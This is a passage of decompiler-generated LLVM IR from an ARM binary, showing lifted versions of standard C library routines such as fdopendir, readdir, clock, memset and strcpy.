.thread1:                                         ; preds = %dec_label_pc_134d4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_134e4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_134e4, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_134f0 = call i32 @fstat()
  store i32 %v0_134f0, i32* @r5, align 4
  %v2_134f4 = icmp eq i32 %v0_134f0, 0
  br i1 %v2_134f4, label %dec_label_pc_134fc, label %dec_label_pc_13574

dec_label_pc_134fc:                               ; preds = %entry
  %v1_13500 = and i32 %tmp4, 61440
  store i32 %v1_13500, i32* @r3, align 4
  %v7_13504 = icmp eq i32 %v1_13500, 16384
  br i1 %v7_13504, label %dec_label_pc_13524, label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134fc
  %v0_13510 = call i32 @__aeabi_read_tp()
  %v3_13514 = load i16, i16* @global_var_244d0.762, align 2
  %v0_13518 = load i32, i32* @r5, align 4
  store i32 %v0_13518, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13558

dec_label_pc_13524:                               ; preds = %dec_label_pc_134fc
  %v0_13524 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1352c = call i32 @__libc_fcntl(i32 %v0_13524, i32 3)
  %v7_13530 = icmp eq i32 %v2_1352c, -1
  br i1 %v7_13530, label %dec_label_pc_13574, label %dec_label_pc_13538

dec_label_pc_13538:                               ; preds = %dec_label_pc_13524
  %v1_13538 = urem i32 %v2_1352c, 4
  store i32 %v1_13538, i32* %r3.global-to-local, align 4
  %v7_1353c = icmp eq i32 %v1_13538, 1
  br i1 %v7_1353c, label %dec_label_pc_13544, label %dec_label_pc_13560

dec_label_pc_13544:                               ; preds = %dec_label_pc_13538
  %v0_13548 = call i32 @__aeabi_read_tp()
  %v3_1354c = load i16, i16* @global_var_244d0.762, align 2
  %v0_13550 = load i32, i32* @r5, align 4
  store i32 %v0_13550, i32* %r1.global-to-local, align 4
  %v0_13554 = load i32, i32* %r3.global-to-local, align 4
  %v1_13554 = add i32 %v0_13554, 21
  br label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_1350c, %dec_label_pc_13544
  %v2_13558.in = phi i16 [ %v3_13514, %dec_label_pc_1350c ], [ %v3_1354c, %dec_label_pc_13544 ]
  %v1_13558 = phi i32 [ %v0_13510, %dec_label_pc_1350c ], [ %v0_13548, %dec_label_pc_13544 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_1350c ], [ %v1_13554, %dec_label_pc_13544 ]
  %v2_13558 = sext i16 %v2_13558.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_13558 = add i32 %v1_13558, %v2_13558
  %v4_13558 = inttoptr i32 %v3_13558 to i32*
  store i32 %storemerge, i32* %v4_13558, align 4
  %v0_13578.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13578

dec_label_pc_13560:                               ; preds = %dec_label_pc_13538
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_13564 = load i32, i32* @r4, align 4
  %v2_13568 = call i32 @fd_to_DIR(i32 %v0_13564, i32 %tmp)
  store i32 %v2_13568, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13578

dec_label_pc_13574:                               ; preds = %entry, %dec_label_pc_13524
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13578

dec_label_pc_13578:                               ; preds = %dec_label_pc_13560, %dec_label_pc_13558, %dec_label_pc_13574
  %v0_13578 = phi i32 [ %v2_13568, %dec_label_pc_13560 ], [ %v0_13578.pre, %dec_label_pc_13558 ], [ 0, %dec_label_pc_13574 ]
  ret i32 %v0_13578

; uselistorder directives
  uselistorder i32 %v1_13538, { 1, 0 }
  uselistorder i32 %v2_1352c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_13578, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13574, { 1, 0 }
  uselistorder label %dec_label_pc_13558, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_13590 = load i32, i32* @r4, align 4
  %v6_13590 = load i32, i32* @r5, align 4
  %v9_13590 = load i32, i32* @r6, align 4
  %v12_13590 = load i32, i32* @r7, align 4
  %v15_13590 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r6, align 4
  %v1_135a4 = add i32 %tmp, 24
  store i32 %v1_135a4, i32* @r4, align 4
  %v4_135a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 68) to i32*), align 4
  store i32 %v4_135a8, i32* %r1.global-to-local, align 4
  store i32 %v1_135a4, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_135bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_135bc)
  %v0_135d0 = load i32, i32* @r6, align 4
  %v2_135d0 = add i32 %v0_135d0, 16
  %v3_135d0 = inttoptr i32 %v2_135d0 to i32*
  %v4_135d0 = load i32, i32* %v3_135d0, align 4
  store i32 %v4_135d0, i32* @ip, align 4
  store i32 79324, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_135d0)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_135e0

dec_label_pc_135e0:                               ; preds = %dec_label_pc_13610, %entry
  %v0_135e0 = load i32, i32* @r5, align 4
  %v1_135e0 = add i32 %v0_135e0, 4
  %v2_135e0 = inttoptr i32 %v1_135e0 to i32*
  %v3_135e0 = load i32, i32* %v2_135e0, align 4
  store i32 %v3_135e0, i32* %r2.global-to-local, align 4
  %v4_135e0 = add i32 %v0_135e0, 8
  %v5_135e0 = inttoptr i32 %v4_135e0 to i32*
  %v6_135e0 = load i32, i32* %v5_135e0, align 4
  %tmp10 = icmp ugt i32 %v6_135e0, %v3_135e0
  br i1 %tmp10, label %dec_label_pc_13610, label %dec_label_pc_135ec

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135e0
  %v1_135ec = inttoptr i32 %v0_135e0 to i32*
  %v2_135ec = load i32, i32* %v1_135ec, align 4
  %v1_135f0 = add i32 %v0_135e0, 12
  %v2_135f0 = inttoptr i32 %v1_135f0 to i32*
  %v3_135f0 = load i32, i32* %v2_135f0, align 4
  store i32 %v3_135f0, i32* %r1.global-to-local, align 4
  %v1_135f4 = add i32 %v0_135e0, 20
  %v2_135f4 = inttoptr i32 %v1_135f4 to i32*
  %v3_135f4 = load i32, i32* %v2_135f4, align 4
  store i32 %v3_135f4, i32* %r2.global-to-local, align 4
  %v4_135f8 = call i32 @__getdents(i32 %v2_135ec, i32 %v3_135f0, i32 %v3_135f4, i32 %v6_135e0)
  %tmp9 = icmp slt i32 %v4_135f8, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13608

.thread:                                          ; preds = %dec_label_pc_135ec
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1363c

dec_label_pc_13608:                               ; preds = %dec_label_pc_135ec
  %v1_13608 = load i32, i32* @r5, align 4
  %v2_13608 = add i32 %v1_13608, 8
  %v3_13608 = inttoptr i32 %v2_13608 to i32*
  store i32 %v4_135f8, i32* %v3_13608, align 4
  %v0_1360c = load i32, i32* @r7, align 4
  %v1_1360c = load i32, i32* @r5, align 4
  %v2_1360c = add i32 %v1_1360c, 4
  %v3_1360c = inttoptr i32 %v2_1360c to i32*
  store i32 %v0_1360c, i32* %v3_1360c, align 4
  %v0_13610.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_135e0, %dec_label_pc_13608
  %v1_13620 = phi i32 [ %v0_135e0, %dec_label_pc_135e0 ], [ %v0_13610.pre, %dec_label_pc_13608 ]
  %v1_13610 = add i32 %v1_13620, 4
  %v2_13610 = inttoptr i32 %v1_13610 to i32*
  %v3_13610 = load i32, i32* %v2_13610, align 4
  store i32 %v3_13610, i32* %r2.global-to-local, align 4
  %v1_13614 = add i32 %v1_13620, 12
  %v2_13614 = inttoptr i32 %v1_13614 to i32*
  %v3_13614 = load i32, i32* %v2_13614, align 4
  store i32 %v3_13614, i32* %r1.global-to-local, align 4
  %v2_13618 = add i32 %v3_13614, %v3_13610
  store i32 %v2_13618, i32* @r4, align 4
  %v1_1361c = add i32 %v2_13618, 4
  %v2_1361c = inttoptr i32 %v1_1361c to i32*
  %v3_1361c = load i32, i32* %v2_1361c, align 4
  %v2_13620 = add i32 %v1_13620, 16
  %v3_13620 = inttoptr i32 %v2_13620 to i32*
  store i32 %v3_1361c, i32* %v3_13620, align 4
  %v0_13624 = load i32, i32* @r4, align 4
  %v1_13624 = add i32 %v0_13624, 8
  %v2_13624 = inttoptr i32 %v1_13624 to i16*
  %v3_13624 = load i16, i16* %v2_13624, align 2
  %v4_13624 = zext i16 %v3_13624 to i32
  %v0_13628 = load i32, i32* %r2.global-to-local, align 4
  %v1_13628 = load i32, i32* %r1.global-to-local, align 4
  %v2_13628 = add i32 %v1_13628, %v0_13628
  %v3_13628 = inttoptr i32 %v2_13628 to i32*
  %v4_13628 = load i32, i32* %v3_13628, align 4
  store i32 %v4_13628, i32* %r1.global-to-local, align 4
  %v2_1362c = add i32 %v0_13628, %v4_13624
  %v2_13630 = icmp eq i32 %v4_13628, 0
  %v1_13634 = load i32, i32* @r5, align 4
  %v2_13634 = add i32 %v1_13634, 4
  %v3_13634 = inttoptr i32 %v2_13634 to i32*
  store i32 %v2_1362c, i32* %v3_13634, align 4
  br i1 %v2_13630, label %dec_label_pc_135e0, label %dec_label_pc_1363c

dec_label_pc_1363c:                               ; preds = %dec_label_pc_13610, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13648 = load i32, i32* @r6, align 4
  %v2_13648 = add i32 %v0_13648, 44
  %v3_13648 = inttoptr i32 %v2_13648 to i32*
  %v4_13648 = load i32, i32* %v3_13648, align 4
  call void @__pseudo_branch(i32 %v4_13648)
  %v0_13654 = load i32, i32* @r4, align 4
  store i32 %v3_13590, i32* @r4, align 4
  store i32 %v6_13590, i32* @r5, align 4
  store i32 %v9_13590, i32* @r6, align 4
  store i32 %v12_13590, i32* @r7, align 4
  store i32 %v15_13590, i32* @lr, align 4
  ret i32 %v0_13654

; uselistorder directives
  uselistorder i32 %v1_13620, { 0, 2, 1 }
  uselistorder i32 %v6_135e0, { 1, 0 }
  uselistorder i32 %v0_135e0, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_13610, { 1, 0 }
}

define i32 @function_13668(i32 %arg1) local_unnamed_addr {
dec_label_pc_13668:
  %v0_13668 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13668, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13668
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13668, %bb
  %v4_13674 = phi i32 [ %arg1, %dec_label_pc_13668 ], [ 0, %bb ]
  ret i32 %v4_13674

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_13678 = load i32, i32* @lr, align 4
  %v0_13680 = call i32 @__aeabi_read_tp()
  %v3_13684 = load i16, i16* @global_var_244d0.762, align 2
  %v4_13684 = sext i16 %v3_13684 to i32
  %v2_13688 = add i32 %v4_13684, %v0_13680
  store i32 %v0_13678, i32* @lr, align 4
  ret i32 %v2_13688
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_1369c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1369c, i32* @r0, align 4
  %v1_136a4 = call i32 @times(i32 %v2_1369c)
  %v2_136a8 = load i32, i32* %stack_var_-24, align 4
  %v2_136ac = add i32 %v2_136a8, %tmp
  %v2_136b4 = mul i32 %v2_136ac, 10000
  %v1_136b8 = and i32 %v2_136b4, 2147483632
  ret i32 %v1_136b8

; uselistorder directives
  uselistorder i32 %v2_1369c, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1) local_unnamed_addr {
dec_label_pc_136c8:
  %v0_136c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_136c8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_136c8
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_136c8, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_136d0 = call i32 @_memcpy()
  ret i32 %v0_136d0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_136e0 = call i32 @_memcpy()
  ret i32 %v0_136e0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_136f4 = icmp eq i32 %arg3, 8
  store i1 %v8_136f4, i1* %cpsr_z.global-to-local, align 1
  %v5_136f8 = icmp slt i32 %arg3, 8
  br i1 %v5_136f8, label %dec_label_pc_13758, label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %entry
  %v4_136fc = mul i32 %arg2, 256
  %v5_136fc = or i32 %v4_136fc, %arg2
  %v4_13700 = mul i32 %v5_136fc, 65536
  %v5_13700 = or i32 %v4_13700, %v5_136fc
  store i32 %v5_13700, i32* @r1, align 4
  %v1_1370457 = urem i32 %tmp, 4
  %v2_1370458 = icmp eq i32 %v1_1370457, 0
  store i1 %v2_1370458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1370458, label %dec_label_pc_13714, label %bb

bb:                                               ; preds = %dec_label_pc_136fc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_136fc ]
  %v3_1370859 = phi i32 [ %v6_13708, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_136fc ]
  %v4_13708 = inttoptr i32 %v3_1370859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13708, align 1
  %v5_13708 = load i32, i32* @r3, align 4
  %v6_13708 = add i32 %v5_13708, 1
  store i32 %v6_13708, i32* @r3, align 4
  %v0_1370c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13718.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1370c.pr, label %dec_label_pc_13714, label %.thread

.thread:                                          ; preds = %bb
  %v2_1370c = add i32 %v0_13718.pr.pre, -1
  store i32 %v2_1370c, i32* %r2.global-to-local, align 4
  %v1_13704 = urem i32 %v6_13708, 4
  %v2_13704 = icmp eq i32 %v1_13704, 0
  store i1 %v2_13704, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13704, label %dec_label_pc_13714, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13708.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_13708.pre to i8
  br label %bb

dec_label_pc_13714:                               ; preds = %.thread, %bb, %dec_label_pc_136fc
  %v0_1372028 = phi i32 [ %tmp, %dec_label_pc_136fc ], [ %v6_13708, %bb ], [ %v6_13708, %.thread ]
  %v0_13718.pr = phi i32 [ %arg3, %dec_label_pc_136fc ], [ %v0_13718.pr.pre, %bb ], [ %v2_1370c, %.thread ]
  %v0_13714 = load i32, i32* @r1, align 4
  store i32 %v0_13714, i32* %ip.global-to-local, align 4
  %v8_1371810 = icmp eq i32 %v0_13718.pr, 8
  store i1 %v8_1371810, i1* %cpsr_z.global-to-local, align 1
  %v5_1371c11 = icmp slt i32 %v0_13718.pr, 8
  br i1 %v5_1371c11, label %dec_label_pc_13758, label %dec_label_pc_13720.preheader

dec_label_pc_13720.preheader:                     ; preds = %dec_label_pc_13714
  %v1_1372046 = inttoptr i32 %v0_1372028 to i32*
  store i32 %v0_13714, i32* %v1_1372046, align 4
  %v3_1372047 = add i32 %v0_1372028, 4
  %v4_1372048 = inttoptr i32 %v3_1372047 to i32*
  %v5_1372049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1372049, i32* %v4_1372048, align 4
  %v6_1372050 = add i32 %v0_1372028, 8
  store i32 %v6_1372050, i32* @r3, align 4
  %v0_1372451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1372452 = add i32 %v0_1372451, -8
  store i32 %v1_1372452, i32* %r2.global-to-local, align 4
  %v5_1372c53 = icmp slt i32 %v1_1372452, 8
  br i1 %v5_1372c53, label %dec_label_pc_13720.dec_label_pc_13758.loopexit_crit_edge, label %dec_label_pc_13730

dec_label_pc_13730:                               ; preds = %dec_label_pc_13720.preheader, %dec_label_pc_13718.dec_label_pc_13720_crit_edge
  %v6_1372055 = phi i32 [ %v6_13720, %dec_label_pc_13718.dec_label_pc_13720_crit_edge ], [ %v6_1372050, %dec_label_pc_13720.preheader ]
  %v0_1372054 = phi i32 [ %v12_1374c, %dec_label_pc_13718.dec_label_pc_13720_crit_edge ], [ %v0_1372028, %dec_label_pc_13720.preheader ]
  %v1_13730 = inttoptr i32 %v6_1372055 to i32*
  %v2_13730 = load i32, i32* @r1, align 4
  store i32 %v2_13730, i32* %v1_13730, align 4
  %v3_13730 = add i32 %v0_1372054, 12
  %v4_13730 = inttoptr i32 %v3_13730 to i32*
  %v5_13730 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13730, i32* %v4_13730, align 4
  %v6_13730 = add i32 %v0_1372054, 16
  store i32 %v6_13730, i32* @r3, align 4
  %v0_13734 = load i32, i32* %r2.global-to-local, align 4
  %v1_13734 = add i32 %v0_13734, -8
  store i32 %v1_13734, i32* %r2.global-to-local, align 4
  %v5_1373c = icmp slt i32 %v1_13734, 8
  br i1 %v5_1373c, label %dec_label_pc_13730.dec_label_pc_13758.loopexit_crit_edge, label %dec_label_pc_13740

dec_label_pc_13740:                               ; preds = %dec_label_pc_13730
  %v1_13740 = inttoptr i32 %v6_13730 to i32*
  %v2_13740 = load i32, i32* @r1, align 4
  store i32 %v2_13740, i32* %v1_13740, align 4
  %v3_13740 = add i32 %v0_1372054, 20
  %v4_13740 = inttoptr i32 %v3_13740 to i32*
  %v5_13740 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13740, i32* %v4_13740, align 4
  %v6_13740 = add i32 %v0_1372054, 24
  store i32 %v6_13740, i32* @r3, align 4
  %v0_13744 = load i32, i32* %r2.global-to-local, align 4
  %v1_13744 = add i32 %v0_13744, -8
  store i32 %v1_13744, i32* %r2.global-to-local, align 4
  %v5_1374c = icmp slt i32 %v1_13744, 8
  br i1 %v5_1374c, label %dec_label_pc_13740.dec_label_pc_13758.loopexit_crit_edge, label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_13740
  %v7_1374c = inttoptr i32 %v6_13740 to i32*
  %v8_1374c = load i32, i32* @r1, align 4
  store i32 %v8_1374c, i32* %v7_1374c, align 4
  %v9_1374c = add i32 %v0_1372054, 28
  %v10_1374c = inttoptr i32 %v9_1374c to i32*
  %v11_1374c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1374c, i32* %v10_1374c, align 4
  %v12_1374c = add i32 %v0_1372054, 32
  store i32 %v12_1374c, i32* @r3, align 4
  %v6_13750 = load i32, i32* %r2.global-to-local, align 4
  %v7_13750 = add i32 %v6_13750, -8
  store i32 %v7_13750, i32* %r2.global-to-local, align 4
  %v5_1371c = icmp slt i32 %v7_13750, 8
  br i1 %v5_1371c, label %dec_label_pc_13718.dec_label_pc_13758.loopexit_crit_edge, label %dec_label_pc_13718.dec_label_pc_13720_crit_edge

dec_label_pc_13718.dec_label_pc_13720_crit_edge:  ; preds = %dec_label_pc_13718
  %v2_13720.pre = load i32, i32* @r1, align 4
  %v1_13720 = inttoptr i32 %v12_1374c to i32*
  store i32 %v2_13720.pre, i32* %v1_13720, align 4
  %v3_13720 = add i32 %v0_1372054, 36
  %v4_13720 = inttoptr i32 %v3_13720 to i32*
  %v5_13720 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13720, i32* %v4_13720, align 4
  %v6_13720 = add i32 %v0_1372054, 40
  store i32 %v6_13720, i32* @r3, align 4
  %v0_13724 = load i32, i32* %r2.global-to-local, align 4
  %v1_13724 = add i32 %v0_13724, -8
  store i32 %v1_13724, i32* %r2.global-to-local, align 4
  %v5_1372c = icmp slt i32 %v1_13724, 8
  br i1 %v5_1372c, label %dec_label_pc_13720.dec_label_pc_13758.loopexit_crit_edge, label %dec_label_pc_13730

dec_label_pc_13718.dec_label_pc_13758.loopexit_crit_edge: ; preds = %dec_label_pc_13718
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13758

dec_label_pc_13720.dec_label_pc_13758.loopexit_crit_edge: ; preds = %dec_label_pc_13718.dec_label_pc_13720_crit_edge, %dec_label_pc_13720.preheader
  %v1_13724.lcssa = phi i32 [ %v1_1372452, %dec_label_pc_13720.preheader ], [ %v1_13724, %dec_label_pc_13718.dec_label_pc_13720_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13758

dec_label_pc_13730.dec_label_pc_13758.loopexit_crit_edge: ; preds = %dec_label_pc_13730
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13758

dec_label_pc_13740.dec_label_pc_13758.loopexit_crit_edge: ; preds = %dec_label_pc_13740
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13714, %dec_label_pc_13718.dec_label_pc_13758.loopexit_crit_edge, %dec_label_pc_13720.dec_label_pc_13758.loopexit_crit_edge, %dec_label_pc_13730.dec_label_pc_13758.loopexit_crit_edge, %dec_label_pc_13740.dec_label_pc_13758.loopexit_crit_edge, %entry
  %v0_13760 = phi i32 [ %arg3, %entry ], [ %v1_13744, %dec_label_pc_13740.dec_label_pc_13758.loopexit_crit_edge ], [ %v1_13734, %dec_label_pc_13730.dec_label_pc_13758.loopexit_crit_edge ], [ %v1_13724.lcssa, %dec_label_pc_13720.dec_label_pc_13758.loopexit_crit_edge ], [ %v7_13750, %dec_label_pc_13718.dec_label_pc_13758.loopexit_crit_edge ], [ %v0_13718.pr, %dec_label_pc_13714 ]
  %v2_13758 = icmp eq i32 %v0_13760, 0
  store i1 %v2_13758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13758, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13758
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13758
  %v1_13760 = sub i32 7, %v0_13760
  store i32 %v1_13760, i32* %r2.global-to-local, align 4
  %v3_13764 = mul i32 %v1_13760, 4
  %v4_13764 = add i32 %v3_13764, ptrtoint (i32* @global_var_1376c.811 to i32)
  call void @__pseudo_branch(i32 %v4_13764)
  %v0_1376c = load i32, i32* @r1, align 4
  %v1_1376c = trunc i32 %v0_1376c to i8
  %v2_1376c = load i32, i32* @r3, align 4
  %v3_1376c = inttoptr i32 %v2_1376c to i8*
  store i8 %v1_1376c, i8* %v3_1376c, align 1
  %v4_1376c = load i32, i32* @r3, align 4
  %v5_1376c = add i32 %v4_1376c, 1
  store i32 %v5_1376c, i32* %r3.global-to-local, align 4
  %v0_13770 = load i32, i32* @r1, align 4
  %v1_13770 = trunc i32 %v0_13770 to i8
  %v3_13770 = inttoptr i32 %v5_1376c to i8*
  store i8 %v1_13770, i8* %v3_13770, align 1
  %v4_13770 = load i32, i32* %r3.global-to-local, align 4
  %v5_13770 = add i32 %v4_13770, 1
  store i32 %v5_13770, i32* %r3.global-to-local, align 4
  %v0_13774 = load i32, i32* @r1, align 4
  %v1_13774 = trunc i32 %v0_13774 to i8
  %v3_13774 = inttoptr i32 %v5_13770 to i8*
  store i8 %v1_13774, i8* %v3_13774, align 1
  %v4_13774 = load i32, i32* %r3.global-to-local, align 4
  %v5_13774 = add i32 %v4_13774, 1
  store i32 %v5_13774, i32* %r3.global-to-local, align 4
  %v0_13778 = load i32, i32* @r1, align 4
  %v1_13778 = trunc i32 %v0_13778 to i8
  %v3_13778 = inttoptr i32 %v5_13774 to i8*
  store i8 %v1_13778, i8* %v3_13778, align 1
  %v4_13778 = load i32, i32* %r3.global-to-local, align 4
  %v5_13778 = add i32 %v4_13778, 1
  store i32 %v5_13778, i32* %r3.global-to-local, align 4
  %v0_1377c = load i32, i32* @r1, align 4
  %v1_1377c = trunc i32 %v0_1377c to i8
  %v3_1377c = inttoptr i32 %v5_13778 to i8*
  store i8 %v1_1377c, i8* %v3_1377c, align 1
  %v4_1377c = load i32, i32* %r3.global-to-local, align 4
  %v5_1377c = add i32 %v4_1377c, 1
  store i32 %v5_1377c, i32* %r3.global-to-local, align 4
  %v0_13780 = load i32, i32* @r1, align 4
  %v1_13780 = trunc i32 %v0_13780 to i8
  %v3_13780 = inttoptr i32 %v5_1377c to i8*
  store i8 %v1_13780, i8* %v3_13780, align 1
  %v4_13780 = load i32, i32* %r3.global-to-local, align 4
  %v5_13780 = add i32 %v4_13780, 1
  store i32 %v5_13780, i32* %r3.global-to-local, align 4
  %v0_13784 = load i32, i32* @r1, align 4
  %v1_13784 = trunc i32 %v0_13784 to i8
  %v3_13784 = inttoptr i32 %v5_13780 to i8*
  store i8 %v1_13784, i8* %v3_13784, align 1
  %v4_13784 = load i32, i32* %r3.global-to-local, align 4
  %v5_13784 = add i32 %v4_13784, 1
  store i32 %v5_13784, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13720, { 1, 0 }
  uselistorder i32 %v12_1374c, { 1, 2, 0 }
  uselistorder i32 %v0_1372054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13718.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13708, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_136fc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 0, 9, 8, 1, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13758, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13730, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_137a01 = load i32, i32* @r1, align 4
  %v1_137a02 = inttoptr i32 %v0_137a01 to i8*
  %v2_137a03 = load i8, i8* %v1_137a02, align 1
  %v2_137a45 = icmp eq i8 %v2_137a03, 0
  store i1 %v2_137a45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_137a03, i8* %arg1, align 1
  br i1 %v2_137a45, label %dec_label_pc_137b0, label %dec_label_pc_13798

dec_label_pc_13798:                               ; preds = %entry, %dec_label_pc_13798
  %v0_13798 = load i32, i32* @r1, align 4
  %v1_13798 = add i32 %v0_13798, 1
  store i32 %v1_13798, i32* @r1, align 4
  %v0_1379c = load i32, i32* %r2.global-to-local, align 4
  %v1_1379c = add i32 %v0_1379c, 1
  store i32 %v1_1379c, i32* %r2.global-to-local, align 4
  %v1_137a0 = inttoptr i32 %v1_13798 to i8*
  %v2_137a0 = load i8, i8* %v1_137a0, align 1
  %v2_137a4 = icmp eq i8 %v2_137a0, 0
  store i1 %v2_137a4, i1* %cpsr_z.global-to-local, align 1
  %v3_137a8 = inttoptr i32 %v1_1379c to i8*
  store i8 %v2_137a0, i8* %v3_137a8, align 1
  %v0_137ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_137ac, label %dec_label_pc_137b0, label %dec_label_pc_13798

